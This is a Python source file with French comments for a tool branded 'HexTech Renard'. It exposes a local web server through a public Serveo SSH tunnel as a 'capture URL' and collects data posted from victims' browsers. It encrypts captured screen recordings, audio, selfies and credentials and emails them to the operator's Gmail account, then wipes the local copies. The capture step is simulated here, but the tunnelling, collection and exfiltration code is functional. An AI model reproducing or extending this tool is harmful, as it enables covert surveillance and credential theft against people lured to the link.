from http.server import BaseHTTPRequestHandler, HTTPServer
import json
import os
import sys
import time
import smtplib
import socket
import subprocess
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import base64
import json
from socketserver import ThreadingMixIn
import urllib.parse

# Configuration
CONFIG = {
    'TEMP_DIR': "captures",
    'SERVER_TIMEOUT': 30,
    'AUDIO_DURATION': 12,
    'SCREEN_DURATION': 12,
    'SELFIE_COUNT': 8,
    'MAX_FILE_SIZE': 10 * 1024 * 1024,  # 10MB
    'AES_KEY_SIZE': 32,  # 256 bits
    'WEB_ROOT': 'web'  # Dossier contenant les fichiers web
}

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('surveillance.log'),
        logging.StreamHandler()
    ]
)

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Serveur HTTP multi-thread"""
    pass

class HTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        """Gère les requêtes GET pour servir les fichiers statiques"""
        try:
            # Déterminer le chemin du fichier demandé
            path = self.path.split('?')[0]  # Ignorer les paramètres de requête
            if path == '/':
                path = '/index.html'
            
            # Sécurité: empêcher l'accès aux répertoires parents
            if '..' in path:
                self.send_error(403, "Accès interdit")
                return
            
            # Construire le chemin complet du fichier
            filepath = os.path.join(CONFIG['WEB_ROOT'], path.lstrip('/'))
            
            # Vérifier si le fichier existe
            if not os.path.exists(filepath):
                self.send_error(404, "Fichier non trouvé")
                return
                
            # Déterminer le type MIME
            if filepath.endswith('.html'):
                mimetype = 'text/html'
            elif filepath.endswith('.js'):
                mimetype = 'application/javascript'
            elif filepath.endswith('.css'):
                mimetype = 'text/css'
            else:
                mimetype = 'application/octet-stream'
            
            # Envoyer le fichier
            self.send_response(200)
            self.send_header('Content-type', mimetype)
            self.end_headers()
            
            with open(filepath, 'rb') as f:
                self.wfile.write(f.read())
                
        except Exception as e:
            self.send_error(500, str(e))

    def do_POST(self):
        """Gère l'envoi des données depuis le JS"""
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data)
            
            # Traitement des données reçues
            logging.info(f"Données reçues: {data}")
            
            # Ici vous pouvez ajouter votre logique de traitement
            # Par exemple, stocker les données ou les envoyer par email
            
            # Réponse JSON
            response = {
                "status": "success",
                "message": "Données reçues avec succès",
                "received_data": data,
                "timestamp": time.time()
            }
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps(response).encode())
            
        except Exception as e:
            logging.error(f"Erreur traitement POST: {str(e)}")
            self.send_error(500, str(e))

class SecureSurveillance:
    def __init__(self):
        os.makedirs(CONFIG['TEMP_DIR'], exist_ok=True)
        os.makedirs(CONFIG['WEB_ROOT'], exist_ok=True)  # Créer le dossier web s'il n'existe pas
        self.files_to_send = []
        self.user_email = ""
        self.app_password = ""
        self.aes_key = get_random_bytes(CONFIG['AES_KEY_SIZE'])
        self.iv = get_random_bytes(16)
        self.http_server = None
        self.tunnel_process = None
        self.http_thread = None
        
    def show_banner(self):
        """Bannière ASCII améliorée"""
        banner = r"""
█╗  ██╗███████╗██╗  ██╗████████╗███████╗ ██████╗██╗  ██╗
██║  ██║██╔════╝╚██╗██╔╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
███████║█████╗   ╚███╔╝    ██║   █████╗  ██║     ███████║
██╔══██║██╔══╝   ██╔██╗    ██║   ██╔══╝  ██║     ██╔══██║
██║  ██║███████╗██╔╝ ██╗   ██║   ███████╗╚██████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝╚═╝  ╚═╝
-------------------------------------------------------
   ╔═════════════════════════════════════════════╗
   ║       [✓] TOOL NAME : RENARD                                            
   ║       [✓] GITHUB : SAMSMIS01                
   ║       [✓] TELEGRAM : https://t.me/hextechcar  ║
   ║       [✓] INSTAGRAM : SAMSMIS01
   ║       [✓] EMAIL : hextech243@gmail.com         ╚═══════════════════════════════════════════════╝
--------------------------------------------------------
"""
        print(f"\033[1;32m{banner}\033[0m")

    def start_http_server(self):
        """Démarrer le serveur HTTP avec gestion multi-thread"""
        server_address = ('localhost', 8000)
        self.http_server = ThreadedHTTPServer(server_address, HTTPRequestHandler)
        logging.info(f"Serveur HTTP démarré sur http://{server_address[0]}:{server_address[1]}")
        self.http_server.serve_forever()

    def encrypt_file(self, filepath):
        """Chiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            cipher = AES.new(self.aes_key, AES.MODE_CBC, self.iv)
            ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
            
            encrypted_path = f"{filepath}.enc"
            with open(encrypted_path, 'wb') as f:
                f.write(self.iv)
                f.write(ciphertext)
                
            return encrypted_path
        except Exception as e:
            logging.error(f"Erreur chiffrement: {str(e)}")
            return None

    def decrypt_file(self, filepath):
        """Déchiffrement AES des fichiers"""
        try:
            with open(filepath, 'rb') as f:
                iv = f.read(16)
                ciphertext = f.read()
            
            cipher = AES.new(self.aes_key, AES.MODE_CBC, iv)
            plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
            
            decrypted_path = filepath.replace('.enc', '')
            with open(decrypted_path, 'wb') as f:
                f.write(plaintext)
                
            return decrypted_path
        except Exception as e:
            logging.error(f"Erreur déchiffrement: {str(e)}")
            return None

    def start_serveo_tunnel(self):
        """Établir un tunnel SSH avec Serveo"""
        try:
            logging.info("Démarrage du serveur HTTP et du tunnel Serveo...")
            
            # Démarrer le serveur HTTP dans un thread
            self.http_thread = threading.Thread(target=self.start_http_server, daemon=True)
            self.http_thread.start()
            
            # Démarrer le tunnel Serveo
            self.tunnel_process = subprocess.Popen(
                ["ssh", "-R", "80:localhost:8000", "serveo.net"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                bufsize=1
            )
            
            # Lire l'URL du tunnel
            url = None
            for line in iter(self.tunnel_process.stderr.readline, ''):
                if "Forwarding" in line:
                    url = line.strip().split()[-1]
                    if not url.startswith("http"):
                        url = f"http://{url}"
                    logging.info(f"Tunnel Serveo établi: {url}")
                    break
            
            if not url:
                raise Exception("Serveo n'a pas retourné d'URL valide")
                
            return url
            
        except Exception as e:
            logging.error(f"Erreur tunnel Serveo: {str(e)}")
            self.stop_serveo_tunnel()
            return None

    def stop_serveo_tunnel(self):
        """Arrêter le tunnel et le serveur HTTP"""
        if self.tunnel_process:
            try:
                self.tunnel_process.terminate()
                self.tunnel_process.wait(timeout=5)
            except:
                try:
                    self.tunnel_process.kill()
                except:
                    pass
            finally:
                self.tunnel_process = None
                
        if self.http_server:
            try:
                self.http_server.shutdown()
                self.http_server.server_close()
            except:
                pass
            finally:
                self.http_server = None

    def secure_email(self, credentials):
        """Envoyer un email sécurisé avec les captures"""
        try:
            if not all([self.user_email, self.app_password]):
                raise Exception("Identifiants email manquants")
            
            msg = MIMEMultipart()
            msg['From'] = self.user_email
            msg['To'] = self.user_email
            msg['Subject'] = '🔒 HexTech Renard - Captures Sécurisées'
            
            body = f"""
            ⚠️ NE PAS PARTAGER ⚠️
            
            Timestamp: {time.ctime()}
            Identifiants capturés: 
            {json.dumps(credentials, indent=2)}
            
            Fichiers joints: {len(self.files_to_send)}
            Clé AES: {base64.b64encode(self.aes_key).decode()}
            """
            msg.attach(MIMEText(body, 'plain'))
            
            for filepath in self.files_to_send:
                if os.path.exists(filepath):
                    encrypted_file = self.encrypt_file(filepath)
                    if encrypted_file:
                        with open(encrypted_file, 'rb') as f:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(f.read())
                        encoders.encode_base64(part)
                        part.add_header(
                            'Content-Disposition',
                            f'attachment; filename="{os.path.basename(encrypted_file)}"'
                        )
                        msg.attach(part)
            
            with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30) as server:
                server.login(self.user_email, self.app_password)
                server.send_message(msg)
            
            logging.info("Email sécurisé envoyé avec succès")
            return True
            
        except Exception as e:
            logging.error(f"Erreur envoi email: {str(e)}")
            return False

    def run(self):
        try:
            self.show_banner()
            
            self.user_email = input("\033[35m[SECURE] Email Gmail: \033[0m").strip()
            self.app_password = input("\033[35m[SECURE] Mot de passe d'application: \033[0m").strip()
            
            if not all([self.user_email.endswith('@gmail.com'), len(self.app_password) >= 16]):
                raise Exception("Authentification invalide")
            
            url = self.start_serveo_tunnel()
            if not url:
                return
                
            print(f"\033[36m[SECURITY] URL de capture: {url}\033[0m")
            logging.info("En attente des données client...")
            
            self._simulate_captures()
            
            if self.secure_email({"user": "test", "pass": "1234"}):
                print("\033[32m[SUCCESS] Vérifiez votre boîte mail!\033[0m")
            else:
                print("\033[31m[ERROR] Échec de l'envoi\033[0m")
                
        except KeyboardInterrupt:
            logging.info("Interruption utilisateur")
        except Exception as e:
            logging.error(f"Erreur système: {str(e)}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Nettoyage sécurisé"""
        self.stop_serveo_tunnel()
        try:
            for root, _, files in os.walk(CONFIG['TEMP_DIR']):
                for file in files:
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(path)))
                        os.unlink(path)
                    except:
                        pass
            logging.info("Nettoyage effectué")
        except:
            pass

    def _simulate_captures(self):
        """Simuler des captures pour le test"""
        logging.info("Simulation des captures...")
        time.sleep(2)
        self.files_to_send = [
            os.path.join(CONFIG['TEMP_DIR'], "screen.webm"),
            os.path.join(CONFIG['TEMP_DIR'], "audio.wav")
        ]
        for i in range(CONFIG['SELFIE_COUNT']):
            self.files_to_send.append(
                os.path.join(CONFIG['TEMP_DIR'], f"selfie_{i+1}.jpg")
            )
        for f in self.files_to_send:
            with open(f, 'wb') as tmp:
                tmp.write(os.urandom(1024))

if __name__ == "__main__":
    try:
        from Crypto.Cipher import AES
    except ImportError:
        print("\033[31mInstallez pycryptodome: pip install pycryptodome\033[0m")
        sys.exit(1)
        
    app = SecureSurveillance()
    app.run()